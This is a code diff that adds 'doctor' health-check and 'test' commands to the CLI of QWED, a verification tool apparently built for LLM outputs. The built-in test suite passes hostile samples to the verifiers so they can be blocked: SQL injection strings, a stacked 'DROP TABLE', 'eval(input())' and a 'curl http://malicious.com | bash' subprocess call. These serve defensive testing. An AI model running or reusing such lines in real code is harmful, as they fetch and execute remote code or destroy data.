@@ -20,7 +20,7 @@ import sys
 import time
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Dict, Optional
+from typing import Any, Dict, List, Optional
 
 import click
 
@@ -1054,6 +1054,363 @@ def init(
     click.echo("\nDocumentation: https://docs.qwedai.com")
     click.echo(SEPARATOR)
     click.echo(f"\nEnvironment file: {env_path}")
+
+
+def _optional_engine_report() -> list[dict]:
+    report: list[dict] = []
+    optional = [
+        ("OpenCV", "cv2", "image verification", "pip install qwed[vision]"),
+    ]
+
+    for label, module_name, detail, install_hint in optional:
+        try:
+            module = __import__(module_name)
+            version = str(getattr(module, "__version__", "built-in"))
+            report.append(
+                {
+                    "name": label,
+                    "ready": True,
+                    "detail": detail,
+                    "install_hint": install_hint,
+                    "version": version,
+                }
+            )
+        except Exception:
+            report.append(
+                {
+                    "name": label,
+                    "ready": False,
+                    "detail": detail,
+                    "install_hint": install_hint,
+                    "version": None,
+                }
+            )
+
+    return report
+
+
+def _provider_connection_profile(active_provider: str) -> dict:
+    profiles = {
+        "openai": {
+            "label": "OpenAI",
+            "connection_slug": "openai",
+            "key_env": "OPENAI_API_KEY",
+            "model_env": "OPENAI_MODEL",
+            "base_url_env": None,
+        },
+        "openai_direct": {
+            "label": "OpenAI",
+            "connection_slug": "openai",
+            "key_env": "OPENAI_API_KEY",
+            "model_env": "OPENAI_MODEL",
+            "base_url_env": None,
+        },
+        "anthropic": {
+            "label": "Anthropic Claude",
+            "connection_slug": "anthropic",
+            "key_env": "ANTHROPIC_API_KEY",
+            "model_env": "ANTHROPIC_MODEL",
+            "base_url_env": None,
+        },
+        "claude_opus": {
+            "label": "Anthropic Claude",
+            "connection_slug": "anthropic",
+            "key_env": "ANTHROPIC_API_KEY",
+            "model_env": "ANTHROPIC_MODEL",
+            "base_url_env": None,
+        },
+        "gemini": {
+            "label": "Google Gemini",
+            "connection_slug": "gemini",
+            "key_env": "GOOGLE_API_KEY",
+            "model_env": "GEMINI_MODEL",
+            "base_url_env": None,
+        },
+        "openai_compat": {
+            "label": "OpenAI-compatible",
+            "connection_slug": "openai-compatible",
+            "key_env": "CUSTOM_API_KEY",
+            "model_env": "CUSTOM_MODEL",
+            "base_url_env": "CUSTOM_BASE_URL",
+        },
+        "azure_openai": {
+            "label": "Azure OpenAI",
+            "connection_slug": "openai-compatible",
+            "key_env": "AZURE_OPENAI_API_KEY",
+            "model_env": "AZURE_OPENAI_DEPLOYMENT",
+            "base_url_env": "AZURE_OPENAI_ENDPOINT",
+        },
+        "ollama": {
+            "label": "Ollama",
+            "connection_slug": "ollama",
+            "key_env": None,
+            "model_env": "OLLAMA_MODEL",
+            "base_url_env": "OLLAMA_BASE_URL",
+        },
+    }
+    return profiles.get(active_provider, {})
+
+
+def _active_provider_status() -> dict:
+    _load_dotenv_if_available()
+    active_provider = os.getenv("ACTIVE_PROVIDER", "ollama").strip().lower().replace("-", "_")
+    if active_provider == "openai_compatible":
+        active_provider = "openai_compat"
+
+    if active_provider == "auto":
+        return {
+            "ok": False,
+            "label": "AUTO",
+            "message": "Auto mode selected; run a live verify call to validate routing.",
+        }
+
+    profile = _provider_connection_profile(active_provider)
+    if not profile:
+        return {
+            "ok": False,
+            "label": active_provider or "unknown",
+            "message": f"Unsupported provider '{active_provider or 'unknown'}'.",
+        }
+
+    api_key = os.getenv(profile["key_env"], "").strip() if profile["key_env"] else ""
+    base_url = os.getenv(profile["base_url_env"], "").strip() if profile["base_url_env"] else ""
+    model = os.getenv(profile["model_env"], "").strip() if profile["model_env"] else ""
+
+    if profile["key_env"] and not api_key:
+        return {
+            "ok": False,
+            "label": profile["label"],
+            "message": f"Missing {profile['key_env']}.",
+        }
+    if profile["base_url_env"] and not base_url:
+        return {
+            "ok": False,
+            "label": profile["label"],
+            "message": f"Missing {profile['base_url_env']}.",
+        }
+
+    try:
+        if profile["connection_slug"] == "gemini":
+            ok, message = _test_gemini_connection(api_key)
+        else:
+            from qwed_new.providers.key_validator import test_connection
+
+            ok, message = test_connection(
+                provider_slug=profile["connection_slug"],
+                api_key=api_key or "",
+                base_url=base_url or None,
+                model=model or None,
+            )
+    except Exception as exc:
+        return {
+            "ok": False,
+            "label": profile["label"],
+            "message": f"Connection check failed: {type(exc).__name__}",
+        }
+
+    return {"ok": bool(ok), "label": profile["label"], "message": message}
+
+
+def _database_health() -> dict:
+    try:
+        from qwed_new.config import settings
+
+        db_url = str(getattr(settings, "DATABASE_URL", "sqlite:///./qwed.db"))
+        if db_url.startswith("sqlite:///"):
+            db_path = db_url.replace("sqlite:///", "", 1)
+            path = Path(db_path)
+            if not path.is_absolute():
+                path = (_project_root() / path).resolve()
+            return {"healthy": path.exists(), "location": str(path)}
+        return {"healthy": True, "location": db_url}
+    except Exception as exc:
+        return {"healthy": False, "location": f"unavailable ({type(exc).__name__})"}
+
+
+def _doctor_report() -> dict:
+    required_ok, required_engines = _required_engine_report()
+    optional_engines = _optional_engine_report()
+    provider = _active_provider_status()
+    db = _database_health()
+
+    raw_server_url = os.getenv("QWED_SERVER_URL", "http://localhost:8000")
+    try:
+        server_url = _normalize_local_server_url(raw_server_url)
+        server_running = _check_server_health(server_url)
+    except ValueError:
+        server_url = raw_server_url
+        server_running = False
+
+    optional_missing = sum(1 for item in optional_engines if not item["ready"])
+    is_operational = required_ok and provider["ok"] and server_running and db["healthy"]
+
+    status = "DEGRADED"
+    if is_operational:
+        status = "OPERATIONAL"
+        if optional_missing:
+            suffix = "engine is" if optional_missing == 1 else "engines are"
+            status = f"OPERATIONAL ({optional_missing} optional {suffix} missing)"
+
+    return {
+        "status": status,
+        "engines": required_engines + optional_engines,
+        "required_engines": required_engines,
+        "optional_engines": optional_engines,
+        "provider": provider,
+        "server": {"running": server_running, "url": server_url},
+        "database": db,
+    }
+
+
+def _print_doctor_report(report: dict) -> None:
+    click.echo("[QWED] System Health Check\n")
+    click.echo("Engines:")
+    for item in report["required_engines"] + report["optional_engines"]:
+        if item["ready"]:
+            click.echo(
+                f"  [ok] {item['name']:<8} {str(item.get('version') or '-'): <8} {item['detail']}"
+            )
+        else:
+            click.echo(
+                f"  [x]  {item['name']:<8} missing  {item['detail']}"
+            )
+            click.echo(f"    -> {item['install_hint']}")
+
+    click.echo("\nProvider:")
+    provider = report["provider"]
+    marker = "[ok]" if provider["ok"] else "[x]"
+    click.echo(f"  {marker} {provider['label']} - {provider['message']}")
+
+    click.echo("\nServer:")
+    server = report["server"]
+    server_marker = "[ok]" if server["running"] else "[x]"
+    server_msg = f"Running on {server['url']}" if server["running"] else f"Not reachable at {server['url']}"
+    click.echo(f"  {server_marker} {server_msg}")
+
+    click.echo("\nDatabase:")
+    database = report["database"]
+    db_marker = "[ok]" if database["healthy"] else "[x]"
+    db_msg = f"{database['location']} (healthy)" if database["healthy"] else f"{database['location']} (unhealthy)"
+    click.echo(f"  {db_marker} {db_msg}")
+
+    click.echo(f"\nStatus: {report['status']}")
+
+
+def _run_full_engine_tests() -> List[dict]:
+    from qwed_new.core.code_verifier import CodeVerifier
+    from qwed_new.core.logic_verifier import LogicVerifier
+    from qwed_new.core.sql_verifier import SQLVerifier
+    from qwed_new.core.verifier import VerificationEngine
+
+    results: List[dict] = []
+
+    def add_result(group: str, label: str, passed: bool, result: str, detail: str = "") -> None:
+        results.append(
+            {
+                "group": group,
+                "label": label,
+                "passed": passed,
+                "result": result,
+                "detail": detail,
+            }
+        )
+
+    math_engine = VerificationEngine()
+    logic_engine = LogicVerifier()
+    sql_engine = SQLVerifier()
+    code_engine = CodeVerifier()
+
+    math_valid = math_engine.verify_math("2+2", 4)
+    add_result("Math", "2+2=4", math_valid.get("status") == "VERIFIED", "VALID")
+
+    math_blocked = math_engine.verify_math("2+2", 5)
+    add_result("Math", "2+2=5", math_blocked.get("status") == "CORRECTION_NEEDED", "BLOCKED")
+
+    math_large = math_engine.verify_math("997*998*999", 994010994)
+    math_large_value = math_large.get("calculated_value")
+    if isinstance(math_large_value, float) and math_large_value.is_integer():
+        math_large_value = int(math_large_value)
+    add_result(
+        "Math",
+        "997*998*999",
+        math_large.get("status") == "VERIFIED",
+        f"{math_large_value} (verified)",
+    )
+
+    logic_unsat = logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"])
+    add_result("Logic", "x>5 AND x<3", logic_unsat.status == "UNSAT", "UNSAT (contradiction)")
+
+    logic_sat = logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"])
+    logic_sat_model = (logic_sat.model or {}).get("x", "?")
+    add_result("Logic", "x>3 AND x<10", logic_sat.status == "SAT", f"SAT {{x={logic_sat_model}}}")
+
+    logic_bool = logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"])
+    add_result("Logic", "approval=1 AND approval=0", logic_bool.status == "UNSAT", "UNSAT (contradiction)")
+
+    sql_safe = sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123")
+    add_result("SQL", "Valid SELECT", sql_safe.get("status") == "SAFE", "SAFE")
+
+    sql_injection = sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1")
+    add_result("SQL", "OR 1=1 injection", sql_injection.get("status") == "BLOCKED", "BLOCKED")
+
+    sql_stacked = sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;")
+    add_result("SQL", "DROP TABLE stacked", sql_stacked.get("status") == "BLOCKED", "BLOCKED")
+
+    code_safe = code_engine.verify_code("def add(a, b):\n    return a + b\n", language="python")
+    add_result("Code", "Safe function", code_safe.get("status") == "SAFE", "SAFE")
+
+    code_eval = code_engine.verify_code("eval(input())", language="python")
+    add_result("Code", "eval(input)", code_eval.get("status") == "BLOCKED", "BLOCKED (CRITICAL)")
+
+    code_pipe = code_engine.verify_code(
+        'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
+        language="python",
+    )
+    add_result("Code", "curl | bash", code_pipe.get("status") == "BLOCKED", "BLOCKED (CRITICAL)")
+
+    return results
+
+
+@cli.command()
+@click.option("--json", "as_json", is_flag=True, help="Machine-readable output.")
+def doctor(as_json: bool):
+    """Run a local QWED system health check."""
+    report = _doctor_report()
+
+    if as_json:
+        click.echo(json.dumps(report, indent=2))
+    else:
+        _print_doctor_report(report)
+
+    if report["status"].startswith("DEGRADED"):
+        sys.exit(1)
+
+
+@cli.command(name="test")
+@click.option("--verbose", is_flag=True, help="Show detailed test output.")
+def test_command(verbose: bool):
+    """Run deterministic verification tests for math, logic, SQL, and code engines."""
+    click.echo("[QWED] Running verification test suite...")
+    results = _run_full_engine_tests()
+
+    for group in ("Math", "Logic", "SQL", "Code"):
+        click.echo(f"\n{group}:")
+        group_items = [item for item in results if item["group"] == group]
+        for item in group_items:
+            marker = "[ok]" if item["passed"] else "[x]"
+            click.echo(f"  {marker} {item['label']:<22} -> {item['result']}")
+            if verbose and item.get("detail"):
+                click.echo(f"    {item['detail']}")
+
+    total = len(results)
+    passed = sum(1 for item in results if item["passed"])
+
+    if passed == total:
+        click.echo(f"\n{passed}/{total} tests passed. All engines operational.")
+        return
+
+    click.echo(f"\n{passed}/{total} tests passed. Review failures above.", err=True)
+    sys.exit(1)
 
 
 @cli.command()
